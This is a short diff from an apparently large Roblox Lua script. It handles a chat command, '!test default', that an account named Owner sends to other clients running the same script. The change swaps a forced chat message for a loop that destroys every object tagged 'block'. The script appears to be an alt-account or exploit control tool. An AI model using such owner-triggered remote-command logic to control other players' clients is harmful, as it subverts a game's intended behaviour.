@@ -6190,7 +6190,9 @@ task.spawn(function()
 				end
 
 				if Message:lower() == "!test default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
-game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('Test', 'All');
+					task.spawn(function()
+						for i, v in next, CollectionService:GetTagged("block") do
+							v:Destroy()
 						end
 					end)
 				end
